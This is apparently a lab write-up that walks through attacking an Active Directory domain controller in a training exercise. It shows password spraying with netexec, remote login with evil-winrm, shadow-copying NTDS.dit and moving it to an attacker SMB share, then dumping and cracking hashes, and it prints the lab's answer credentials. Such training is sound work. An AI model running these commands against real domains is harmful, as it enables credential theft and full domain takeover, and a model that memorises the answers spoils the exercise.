### Attacking Active Directory

IP: 10.129.202.85

---

### Question 1:
What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

The name of the file stored on a domain controller that contains the password hashes of all domain accounts is NTDS.dit.

&#x1F6A9; found **NTDS.dit**.

---

### Question 2:
Submit the NT hash associated with the Administrator user from the example output in the section reading.

&#x1F6A9; found **64f12cddaa88057e06a81b54e73b949b**.

---

### Question 3:
On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller, and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

I start off by creating a text file of the names given.

```diff
+ $ cat names.txt
```

	john marston
	carol johnson
	jennifer stapleton

I then pass this to username-anarchy to create a modified username wordlist.

```diff
+ $ ./username-anarchy -i ../Downloads/names.txt > actualnames.txt
```

Now I use this file to perform a dictionary attack with netexec.

```diff
+ $ netexec smb 10.129.202.85 -u actualnames.txt -p /usr/share/wordlists/fasttrack.txt
```

	<snip>
	SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
	<snip>

I got a hit.

&#x1F6A9; found **jmarston:P@ssword!**.

---

### Question 4:
Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

So I now use evil-winrm to connect using this username and password.

```diff
+ $ evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
```

	*Evil-WinRM* PS C:\Users\jmarston\Documents>

From here I look at my user's privileges to see if I am capable of creating a shadow copy.

```diff
+ *Evil-WinRM* PS C:\Users\jmarston\Documents> net localgroup
```

	Aliases for \\ILF-DC01
	<snip>
	*Administrators
	<snip>

```diff
+ *Evil-WinRM* PS C:\Users\jmarston\Documents> net user jmarston
```

	<snip>
	Global Group memberships     *Domain Admins        *Domain Users
	                             *Leadership
	<snip>

The user has administrative and domain privileges, so I now create a shadow copy of the C: drive and create a copy of the file.

```diff
+ *Evil-WinRM* PS C:\Users\jmarston\Documents> vssadmin CREATE SHADOW /For=C:
```

	vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
	(C) Copyright 2001-2013 Microsoft Corp.

	Successfully created shadow copy for 'C:\'
	    Shadow Copy ID: {15beda38-07c7-44b7-aa22-ebdec99772dd}
	    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

```diff
+ *Evil-WinRM* PS C:\Users\jmarston\Documents> mkdir C:\NTDS
```

	    Directory: C:\

	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----       10/15/2026   4:53 PM                NTDS

```diff
+ *Evil-WinRM* PS C:\Users\jmarston\Documents> cd C:\NTDS
+ *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

	        1 file(s) copied.

Now with the file copied, I create an smbserver on my attack machine to transfer the file.

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/Documents
+ *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.120\CompData
```

Once the file transfers to my attack host, I dump the hashes using netexec, marking -M ntdsutil.

```diff
+ $ netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
```

	<snip>
	NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
	<snip>

With the hash, I pass it to hashcat for cracking.

```diff
+ $ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
```

	<snip>
	92fd67fd2f49d0e83744aa82363f021b:Winter2008
	<snip>

&#x1F6A9; found **Winter2008**.
